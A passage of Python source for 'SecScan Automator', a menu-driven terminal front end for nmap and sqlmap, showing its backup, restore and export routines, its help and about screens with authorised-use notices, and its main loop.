            print(f"\n{Colors.CYAN}Available backups:{Colors.END}")
            for i, backup in enumerate(backup_files, 1):
                print(f"{Colors.GREEN}{i}.{Colors.END} {backup}")
            
            choice = self.get_menu_choice(len(backup_files))
            
            if choice > 0 and choice <= len(backup_files):
                selected_backup = os.path.join("backups", backup_files[choice - 1])
                
                print(f"{Colors.YELLOW}{Icons.WARNING} This will replace current configuration. Continue? (y/n): {Colors.END}")
                confirm = input(f"{Colors.WHITE}{Icons.ARROW} ").strip().lower()
                
                if confirm in ['y', 'yes']:
                    try:
                        shutil.copy2(selected_backup, self.config_manager.config_file)
                        self.config_manager.config = self.config_manager._load_config()
                        print(f"{Colors.GREEN}{Icons.SUCCESS} Configuration restored{Colors.END}")
                    except Exception as e:
                        print(f"{Colors.RED}{Icons.ERROR} Restore failed: {e}{Colors.END}")
                else:
                    print(f"{Colors.YELLOW}{Icons.INFO} Restore cancelled{Colors.END}")
            
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("RestoreConfig", str(e))
    
    def reset_configuration(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.TRASH} Reset Configuration{Colors.END}")
            print(f"{Colors.YELLOW}{Icons.WARNING} This will reset all settings to defaults{Colors.END}")
            print(f"{Colors.RED}Type 'RESET' to confirm: {Colors.END}")
            
            confirm = input(f"{Colors.WHITE}{Icons.ARROW} ").strip()
            
            if confirm == 'RESET':
                username = self.config_manager.get('username', 'SecScanUser')  # Preserve username
                
                self.config_manager.config = self.config_manager.default_config.copy()
                self.config_manager.set('username', username)  # Restore username
                
                print(f"{Colors.GREEN}{Icons.SUCCESS} Configuration reset to defaults{Colors.END}")
            else:
                print(f"{Colors.YELLOW}{Icons.INFO} Reset cancelled{Colors.END}")
            
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("ResetConfig", str(e))
    
    def export_backup_menu(self):
        try:
            while True:
                self.clear_screen()
                print(f"\n{Colors.BOLD}{Icons.EXPORT} EXPORT & BACKUP{Colors.END}")
                print(f"{Colors.CYAN}Export data and manage backups{Colors.END}")
                
                print(f"\n{Colors.GREEN}1.{Colors.END} {Icons.EXPORT} Export All Reports")
                print(f"{Colors.GREEN}2.{Colors.END} {Icons.SAVE} Create Full Backup")
                print(f"{Colors.GREEN}3.{Colors.END} {Icons.UPLOAD} Restore from Backup")
                print(f"{Colors.GREEN}4.{Colors.END} {Icons.FOLDER} Archive Old Data")
                print(f"{Colors.GREEN}5.{Colors.END} {Icons.CHART} Export Statistics")
                print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to Main Menu")
                
                choice = self.get_menu_choice(5)
                
                if choice == 1:
                    self.export_all_reports()
                elif choice == 2:
                    self.create_full_backup()
                elif choice == 3:
                    self.restore_from_backup()
                elif choice == 4:
                    self.archive_old_data()
                elif choice == 5:
                    self.export_statistics()
                elif choice == 0:
                    break
        except Exception as e:
            self.db_manager.log_error("ExportBackupMenu", str(e))
        
        return True
    
    def export_all_reports(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.EXPORT} Export All Reports{Colors.END}")
            
            reports = self.db_manager.get_reports(1000)  # Get all reports
            
            if not reports:
                print(f"{Colors.YELLOW}{Icons.INFO} No reports to export{Colors.END}")
                self.wait_for_key()
                return
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            export_dir = f"export_{timestamp}"
            os.makedirs(export_dir, exist_ok=True)
            
            print(f"{Colors.CYAN}Exporting {len(reports)} reports...{Colors.END}")
            
            progress = AdvancedProgressBar(total=len(reports), title="Exporting Reports")
            progress.start()
            
            exported_count = 0
            
            for i, report in enumerate(reports):
                try:
                    source_file = report[6]  # file_path
                    if os.path.exists(source_file):
                        filename = os.path.basename(source_file)
                        dest_file = os.path.join(export_dir, filename)
                        shutil.copy2(source_file, dest_file)
                        exported_count += 1
                    
                    progress.update(i + 1)
                except Exception:
                    continue
            
            progress.stop()
            
            # Create metadata file
            metadata = {
                'export_date': datetime.now().isoformat(),
                'total_reports': len(reports),
                'exported_files': exported_count,
                'reports': [
                    {
                        'id': r[0], 'name': r[1], 'target': r[2], 'scan_type': r[3],
                        'mode': r[4], 'created_date': r[5], 'file_path': r[6]
                    } for r in reports
                ]
            }
            
            with open(os.path.join(export_dir, 'metadata.json'), 'w') as f:
                json.dump(metadata, f, indent=2)
            
            print(f"{Colors.GREEN}{Icons.SUCCESS} Exported {exported_count} reports to '{export_dir}'{Colors.END}")
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("ExportAllReports", str(e))
            print(f"{Colors.RED}{Icons.ERROR} Export failed: {e}{Colors.END}")
            self.wait_for_key()
    
    def create_full_backup(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.SAVE} Create Full Backup{Colors.END}")
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_dir = f"full_backup_{timestamp}"
            
            print(f"{Colors.CYAN}Creating full backup...{Colors.END}")
            
            progress = AdvancedProgressBar(total=100, title="Creating Backup")
            progress.start()
            
            # Create backup directory
            os.makedirs(backup_dir, exist_ok=True)
            progress.update(10)
            
            # Backup configuration
            if os.path.exists(self.config_manager.config_file):
                shutil.copy2(self.config_manager.config_file, os.path.join(backup_dir, "config.json"))
            progress.update(20)
            
            # Backup database
            if os.path.exists(self.db_manager.db_file):
                shutil.copy2(self.db_manager.db_file, os.path.join(backup_dir, "database.db"))
            progress.update(40)
            
            # Backup reports directory
            if os.path.exists("reports"):
                shutil.copytree("reports", os.path.join(backup_dir, "reports"))
            progress.update(80)
            
            # Create backup info
            backup_info = {
                'backup_date': datetime.now().isoformat(),
                'version': '2.0',
                'files': {
                    'config': 'config.json',
                    'database': 'database.db',
                    'reports': 'reports/'
                }
            }
            
            with open(os.path.join(backup_dir, 'backup_info.json'), 'w') as f:
                json.dump(backup_info, f, indent=2)
            
            progress.update(90)
            
            # Create ZIP archive
            zip_filename = f"{backup_dir}.zip"
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(backup_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arc_name = os.path.relpath(file_path, backup_dir)
                        zipf.write(file_path, arc_name)
            
            # Remove temporary directory
            shutil.rmtree(backup_dir)
            
            progress.update(100)
            progress.stop()
            
            file_size = os.path.getsize(zip_filename) / (1024 * 1024)  # MB
            print(f"{Colors.GREEN}{Icons.SUCCESS} Full backup created: {zip_filename} ({file_size:.1f} MB){Colors.END}")
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("CreateFullBackup", str(e))
            print(f"{Colors.RED}{Icons.ERROR} Backup failed: {e}{Colors.END}")
            self.wait_for_key()
    
    def restore_from_backup(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.UPLOAD} Restore from Backup{Colors.END}")
            
            backup_files = [f for f in os.listdir('.') if f.startswith('full_backup_') and f.endswith('.zip')]
            
            if not backup_files:
                print(f"{Colors.YELLOW}{Icons.INFO} No backup files found{Colors.END}")
                self.wait_for_key()
                return
            
            print(f"\n{Colors.CYAN}Available backups:{Colors.END}")
            for i, backup in enumerate(backup_files, 1):
                file_size = os.path.getsize(backup) / (1024 * 1024)  # MB
                print(f"{Colors.GREEN}{i}.{Colors.END} {backup} ({file_size:.1f} MB)")
            
            choice = self.get_menu_choice(len(backup_files))
            
            if choice > 0 and choice <= len(backup_files):
                selected_backup = backup_files[choice - 1]
                
                print(f"{Colors.RED}{Icons.WARNING} This will REPLACE all current data! Continue? (type 'RESTORE'): {Colors.END}")
                confirm = input(f"{Colors.WHITE}{Icons.ARROW} ").strip()
                
                if confirm == 'RESTORE':
                    print(f"{Colors.CYAN}Restoring from backup...{Colors.END}")
                    
                    # Extract backup
                    temp_dir = "temp_restore"
                    with zipfile.ZipFile(selected_backup, 'r') as zipf:
                        zipf.extractall(temp_dir)
                    
                    # Restore files
                    if os.path.exists(os.path.join(temp_dir, 'config.json')):
                        shutil.copy2(os.path.join(temp_dir, 'config.json'), self.config_manager.config_file)
                    
                    if os.path.exists(os.path.join(temp_dir, 'database.db')):
                        shutil.copy2(os.path.join(temp_dir, 'database.db'), self.db_manager.db_file)
                    
                    if os.path.exists(os.path.join(temp_dir, 'reports')):
                        if os.path.exists('reports'):
                            shutil.rmtree('reports')
                        shutil.copytree(os.path.join(temp_dir, 'reports'), 'reports')
                    
                    # Cleanup
                    shutil.rmtree(temp_dir)
                    
                    # Reload configuration
                    self.config_manager.config = self.config_manager._load_config()
                    
                    print(f"{Colors.GREEN}{Icons.SUCCESS} Backup restored successfully{Colors.END}")
                else:
                    print(f"{Colors.YELLOW}{Icons.INFO} Restore cancelled{Colors.END}")
            
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("RestoreBackup", str(e))
            print(f"{Colors.RED}{Icons.ERROR} Restore failed: {e}{Colors.END}")
            self.wait_for_key()
    
    def archive_old_data(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.FOLDER} Archive Old Data{Colors.END}")
            
            days = input(f"{Colors.CYAN}Archive data older than how many days? (default: 30): {Colors.END}").strip()
            
            try:
                days = int(days) if days else 30
            except ValueError:
                days = 30
            
            if self.db_manager.cleanup_old_data(days):
                print(f"{Colors.GREEN}{Icons.SUCCESS} Archived data older than {days} days{Colors.END}")
            else:
                print(f"{Colors.RED}{Icons.ERROR} Archive operation failed{Colors.END}")
            
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("ArchiveData", str(e))
    
    def export_statistics(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.CHART} Export Statistics{Colors.END}")
            
            stats = self.db_manager.get_scan_statistics()
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            stats_file = f"statistics_export_{timestamp}.json"
            
            export_data = {
                'export_metadata': {
                    'generated_at': datetime.now().isoformat(),
                    'tool': 'SecScan Automator',
                    'version': '2.0'
                },
                'statistics': stats,
                'user_info': {
                    'username': self.config_manager.get('username', 'SecScanUser'),
                    'total_scans': self.config_manager.get('total_scans', 0),
                    'member_since': self.config_manager.get('created_date', datetime.now().isoformat())
                }
            }
            
            with open(stats_file, 'w', encoding='utf-8') as f:
                json.dump(export_data, f, indent=2, ensure_ascii=False)
            
            print(f"{Colors.GREEN}{Icons.SUCCESS} Statistics exported to: {stats_file}{Colors.END}")
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("ExportStatistics", str(e))
            print(f"{Colors.RED}{Icons.ERROR} Export failed: {e}{Colors.END}")
            self.wait_for_key()
    
    def help_menu(self):
        try:
            self.clear_screen()
            print(f"\n{Colors.BOLD}{Icons.BOOK} HELP & DOCUMENTATION{Colors.END}")
            
            help_sections = [
                ("Quick Start Guide", self._show_quick_start),
                ("Scan Modes Explained", self._show_scan_modes),
                ("Target Formats", self._show_target_formats),
                ("Report Management", self._show_report_help),
                ("Troubleshooting", self._show_troubleshooting),
                ("Keyboard Shortcuts", self._show_shortcuts),
                ("About SecScan Automator", self._show_about)
            ]
            
            print(f"\n{Colors.CYAN}Help Topics:{Colors.END}")
            for i, (title, _) in enumerate(help_sections, 1):
                print(f"{Colors.GREEN}{i}.{Colors.END} {title}")
            
            print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to Main Menu")
            
            choice = self.get_menu_choice(len(help_sections))
            
            if choice > 0 and choice <= len(help_sections):
                _, show_func = help_sections[choice - 1]
                show_func()
            
        except Exception as e:
            self.db_manager.log_error("HelpMenu", str(e))
        
        return True
    
    def _show_quick_start(self):
        help_text = f"""
{Colors.BOLD}QUICK START GUIDE{Colors.END}

{Colors.CYAN}1. First Time Setup:{Colors.END}
   • Install required tools (nmap, sqlmap)
   • Run the application
   • Set your username in Profile menu

{Colors.CYAN}2. Running Your First Scan:{Colors.END}
   • Choose scan type (Nmap or SQLmap)
   • Select difficulty mode (Easy/Medium/Hard)
   • Pick a scan template
   • Enter target (IP, URL, or domain)
   • Add optional notes
   • Confirm and run

{Colors.CYAN}3. Managing Results:{Colors.END}
   • View results in real-time
   • Save reports in multiple formats
   • Access reports through Reports menu
   • Export data for external analysis

{Colors.CYAN}4. Advanced Features:{Colors.END}
   • Create favorite scan templates
   • Manage target groups
   • Set up automated backups
   • Customize settings and preferences
"""
        print(help_text)
        self.wait_for_key()
    
    def _show_scan_modes(self):
        help_text = f"""
{Colors.BOLD}SCAN MODES EXPLAINED{Colors.END}

{Colors.GREEN}Easy Mode:{Colors.END}
   • Perfect for beginners
   • Quick, non-intrusive scans
   • Basic port discovery
   • Service identification
   • Safe for production environments

{Colors.YELLOW}Medium Mode:{Colors.END}
   • Comprehensive security testing
   • More thorough vulnerability detection
   • Advanced scanning techniques
   • Moderate resource usage
   • Suitable for penetration testing

{Colors.RED}Hard Mode:{Colors.END}
   • Expert-level testing
   • Aggressive scanning methods
   • Maximum vulnerability detection
   • Resource-intensive operations
   • Use only on authorized systems

{Colors.CYAN}Tips:{Colors.END}
   • Start with Easy mode to learn
   • Use Medium mode for regular testing
   • Reserve Hard mode for authorized pentests
   • Always get permission before scanning
"""
        print(help_text)
        self.wait_for_key()
    
    def _show_target_formats(self):
        help_text = f"""
{Colors.BOLD}SUPPORTED TARGET FORMATS{Colors.END}

{Colors.CYAN}IP Addresses:{Colors.END}
   • IPv4: 192.168.1.1
   • IPv6: 2001:db8::1
   • CIDR: 192.168.1.0/24

{Colors.CYAN}Domain Names:{Colors.END}
   • example.com
   • subdomain.example.com
   • test-site.example.org

{Colors.CYAN}URLs:{Colors.END}
   • http://example.com
   • https://example.com:8080
   • https://example.com/path

{Colors.CYAN}Special Cases:{Colors.END}
   • localhost (127.0.0.1)
   • Internal networks (10.0.0.0/8, 172.16.0.0/12)
   • Custom ports (example.com:3000)

{Colors.YELLOW}Important:{Colors.END}
   • Only scan systems you own or have permission to test
   • Some scans may trigger security alerts
   • Always follow responsible disclosure practices
"""
        print(help_text)
        self.wait_for_key()
    
    def _show_report_help(self):
        help_text = f"""
{Colors.BOLD}REPORT MANAGEMENT{Colors.END}

{Colors.CYAN}Report Formats:{Colors.END}
   • HTML: Rich, visual reports (recommended)
   • Text: Simple, portable format
   • JSON: Machine-readable data
   • CSV: Spreadsheet-compatible exports

{Colors.CYAN}Managing Reports:{Colors.END}
   • View recent reports
   • Search by target, date, or type
   • Delete old or unwanted reports
   • Export reports in bulk
   • Open reports in external applications

{Colors.CYAN}Report Contents:{Colors.END}
   • Scan metadata (date, duration, mode)
   • Target information
   • Detailed results
   • User notes
   • Risk assessment
   • Recommendations

{Colors.CYAN}Best Practices:{Colors.END}
   • Add meaningful notes to reports
   • Regular cleanup of old reports
   • Export important findings
   • Use consistent naming conventions
"""
        print(help_text)
        self.wait_for_key()
    
    def _show_troubleshooting(self):
        help_text = f"""
{Colors.BOLD}TROUBLESHOOTING{Colors.END}

{Colors.CYAN}Tool Not Found Errors:{Colors.END}
   • Install nmap: apt-get install nmap
   • Install sqlmap: pip install sqlmap
   • Check PATH environment variable
   • Verify tool versions

{Colors.CYAN}Permission Errors:{Colors.END}
   • Run with sudo for some scans
   • Check file permissions
   • Verify write access to reports directory
   • Ensure database permissions

{Colors.CYAN}Network Issues:{Colors.END}
   • Check target connectivity
   • Verify firewall settings
   • Test with ping first
   • Check proxy settings

{Colors.CYAN}Performance Issues:{Colors.END}
   • Reduce concurrent scans
   • Increase timeout values
   • Clean up old data
   • Check system resources

{Colors.CYAN}Common Solutions:{Colors.END}
   • Restart the application
   • Reset configuration to defaults
   • Check error logs
   • Update tool dependencies
"""
        print(help_text)
        self.wait_for_key()
    
    def _show_shortcuts(self):
        help_text = f"""
{Colors.BOLD}KEYBOARD SHORTCUTS{Colors.END}

{Colors.CYAN}Menu Navigation:{Colors.END}
   • Use number keys (1, 2, 3, etc.)
   • 0 - Go back/Exit
   • Ctrl+C - Cancel operation

{Colors.CYAN}Quick Actions:{Colors.END}
   • 'q' or 'quit' - Quick exit
   • 'back' - Return to previous menu
   • Enter - Confirm/Continue

{Colors.CYAN}Input Helpers:{Colors.END}
   • Tab - Auto-complete (where available)
   • Up/Down arrows - Command history
   • Ctrl+L - Clear screen

{Colors.CYAN}Scan Shortcuts:{Colors.END}
   • 'y' or 'yes' - Confirm scan
   • 'n' or 'no' - Cancel scan
   • Empty input - Use defaults

{Colors.CYAN}Report Shortcuts:{Colors.END}
   • 'all' - Select all items
   • 'none' - Deselect all items
   • Number ranges - Select multiple items
"""
        print(help_text)
        self.wait_for_key()
    
    def _show_about(self):
        about_text = f"""
{Colors.BOLD}ABOUT SECSCAN AUTOMATOR{Colors.END}

{Colors.CYAN}Overview:{Colors.END}
SecScan Automator is a comprehensive security scanning tool
that automates network reconnaissance and vulnerability
assessment using industry-standard tools like Nmap and SQLmap.

{Colors.CYAN}Features:{Colors.END}
   • Multiple scan modes (Easy/Medium/Hard)
   • Comprehensive reporting system
   • Target management and organization
   • Advanced configuration options
   • Data export and backup capabilities
   • User-friendly terminal interface

{Colors.CYAN}Created by:{Colors.END}
   @microzort

{Colors.CYAN}Purpose:{Colors.END}
This tool is designed for:
   • Security professionals
   • Penetration testers
   • Network administrators
   • Security researchers
   • Educational purposes

{Colors.YELLOW}Legal Notice:{Colors.END}
This tool should only be used on systems you own or have
explicit permission to test. Unauthorized scanning may be
illegal in your jurisdiction. Always follow responsible
disclosure practices and respect system owners' rights.

{Colors.CYAN}Support:{Colors.END}
For issues, suggestions, or contributions, please contact
the development team through appropriate channels.
"""
        print(about_text)
        self.wait_for_key()
    
    def _check_tool_availability(self, tool_name):
        try:
            result = subprocess.run([tool_name, '--version'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                version_info = result.stdout.split('\n')[0]
                print(f"\n{Colors.GREEN}{Icons.SUCCESS} {tool_name.upper()} detected: {version_info}{Colors.END}")
                return True
            else:
                print(f"\n{Colors.RED}{Icons.ERROR} {tool_name.upper()} not working properly{Colors.END}")
                self._show_installation_help(tool_name)
                return False
        except (subprocess.TimeoutExpired, FileNotFoundError):
            print(f"\n{Colors.RED}{Icons.ERROR} {tool_name.upper()} not found{Colors.END}")
            self._show_installation_help(tool_name)
            return False
    
    def _show_installation_help(self, tool_name):
        print(f"{Colors.CYAN}{Icons.INFO} Installation instructions:{Colors.END}")
        if tool_name == 'nmap':
            print(f"{Colors.WHITE}  • Ubuntu/Debian: sudo apt-get install nmap{Colors.END}")
            print(f"{Colors.WHITE}  • macOS: brew install nmap{Colors.END}")
            print(f"{Colors.WHITE}  • Windows: Download from https://nmap.org/download.html{Colors.END}")
        elif tool_name == 'sqlmap':
            print(f"{Colors.WHITE}  • git clone https://github.com/sqlmapproject/sqlmap.git{Colors.END}")
            print(f"{Colors.WHITE}  • pip install sqlmap{Colors.END}")
        self.wait_for_key()
    
    def wait_for_key(self):
        try:
            input(f"\n{Colors.CYAN}{Icons.INFO} Press Enter to continue...{Colors.END}")
        except (KeyboardInterrupt, EOFError):
            pass
    
    def clear_screen(self):
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
        except Exception:
            print("\n" * 50)
    
    def run(self):
        try:
            self.clear_screen()
            
            while True:
                try:
                    self.display_main_menu()
                    choice = self.get_menu_choice(8)
                    
                    if not self.handle_main_menu_choice(choice):
                        break
                        
                except (KeyboardInterrupt, EOFError):
                    print(f"\n\n{Colors.YELLOW}{Icons.WARNING} Interrupted by user{Colors.END}")
                    break
                except Exception as e:
                    self.db_manager.log_error("MainLoop", str(e))
                    print(f"{Colors.RED}{Icons.ERROR} Unexpected error: {e}{Colors.END}")
                    time.sleep(2)
            
            print(f"\n{Colors.CYAN}{Icons.STAR} Thank you for using SecScan Automator!{Colors.END}")
            print(f"{Colors.GREEN}{Icons.SHIELD} Stay secure and keep testing!{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}Critical error: {e}{Colors.END}")
        finally:
            sys.exit(0)

def main():
    try:
        print(f"{Colors.CYAN}Initializing SecScan Automator...{Colors.END}")
        app = SecScanAutomator()
        app.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Application interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}Failed to start application: {e}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()
